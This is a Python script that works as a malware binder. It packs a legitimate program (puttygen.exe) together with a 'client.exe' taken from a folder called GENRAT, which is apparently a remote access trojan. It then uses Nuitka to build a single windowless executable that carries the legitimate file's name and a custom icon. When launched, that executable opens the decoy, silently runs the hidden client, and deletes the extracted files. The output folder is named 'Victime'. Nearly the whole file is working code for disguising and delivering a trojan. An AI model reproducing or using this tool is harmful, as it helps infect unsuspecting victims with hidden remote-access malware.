import os
import subprocess
import sys
import time
import tempfile
import zipfile

def create_zip_file(zip_path, file_path, client_path):
    """Creates a ZIP file containing the specified file and the client executable."""
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(file_path, os.path.basename(file_path))
        zipf.write(client_path, os.path.basename(client_path))

def extract_zip_file(zip_path, extract_to):
    """Extracts the contents of the ZIP file to the specified directory."""
    with zipfile.ZipFile(zip_path, 'r') as zipf:
        zipf.extractall(extract_to)

def create_temp_script(file_path, client_path):
    """
    Creates a temporary Python script that extracts files from the ZIP,
    opens the specified file, and executes the client executable in the background.
    """
    binder_code = f"""
import os
import subprocess
import sys
import time
import tempfile
import zipfile

def cleanup_files(*files):
    # Deletes the extracted files
    for file in files:
        try:
            os.remove(file)
        except Exception as e:
            print(f"Error deleting {{file}}: {{e}}")

def extract_zip_file(zip_path, extract_to):
    \"\"\"Extracts the contents of the ZIP file to the specified directory.\"\"\" 
    with zipfile.ZipFile(zip_path, 'r') as zipf:
        zipf.extractall(extract_to)

def execute_and_show():
    with tempfile.TemporaryDirectory() as temp_dir:
        zip_path = os.path.join(os.path.dirname(__file__), 'files.zip')
        extract_zip_file(zip_path, temp_dir)

        file_path = os.path.join(temp_dir, '{os.path.basename(file_path)}')
        client_path = os.path.join(temp_dir, '{os.path.basename(client_path)}')

        # Open the specified file (non-blocking)
        try:
            if '{os.path.splitext(file_path)[1]}' == '.exe':
                subprocess.Popen([str(file_path)], shell=True)
            else:
                print("Unsupported extension!")
        except Exception as e:
            print(f"Error opening the file: {{e}}")  

        # Execute the client executable in the background (non-blocking)
        try:
            subprocess.Popen([str(client_path)], shell=True)
        except Exception as e:
            print(f"Error executing the EXE file: {{e}}")

        # Clean up extracted files after execution
        time.sleep(10)
        cleanup_files(file_path, client_path)

if __name__ == "__main__":
    execute_and_show()
"""
    temp_file = os.path.join(tempfile.gettempdir(), "temp_binder.py")
    with open(temp_file, "w", encoding="utf-8") as f:
        f.write(binder_code)
    return temp_file

def build_executable_with_nuitka(temp_script, zip_path, output_name, output_dir, icon_path):
    """
    Builds a standalone executable containing the script and the ZIP file using Nuitka.
    """
    try:
        subprocess.run([
            sys.executable,
            "-m", "nuitka",
            "--standalone",             
            "--onefile",                
            "--mingw64",                
            "--windows-disable-console", 
            "--output-dir=" + output_dir,
            "--windows-icon-from-ico=" + icon_path,
            f"--include-data-files={zip_path}=files.zip",  
            f"--output-filename={output_name}",  
            temp_script
        ], check=True)
    except subprocess.CalledProcessError as e:
        raise RuntimeError("Error creating the executable with Nuitka.") from e

def clean_temp_files(temp_script):
    """Deletes the temporary script."""
    try:
        os.remove(temp_script)
    except Exception as clean_error:
        print(f"Error cleaning temporary files: {clean_error}")

def bind_files(file_path, client_path, icon_path, output_dir):
    """
    Combines opening a specified file with executing a client EXE into a single executable.
    """
    zip_path = os.path.join(tempfile.gettempdir(), 'files.zip')
    create_zip_file(zip_path, file_path, client_path)

    temp_script = create_temp_script(file_path, client_path)

    file_name = os.path.basename(file_path)  # here we give the filename to inject  
    full_output_path = os.path.join(output_dir, file_name)

    build_executable_with_nuitka(temp_script, zip_path, file_name, output_dir, icon_path)

    clean_temp_files(temp_script)

    print(f"Combined file '{full_output_path}' generated successfully.")

if __name__ == "__main__":
    file_path = "C:\\Users\\HP\\Downloads\\puttygen.exe"  # Path to the file to open
    client_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\client.exe"  # Path to the client executable
    output_dir = "C:\\Users\\HP\\OneDrive\\Desktop\\Victime"  # Fixed output directory
    icon_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\win.ico"  # Path to the icon

    try:
        bind_files(file_path, client_path, icon_path, output_dir)
    except Exception as main_error:
        print(f"Error: {main_error}")
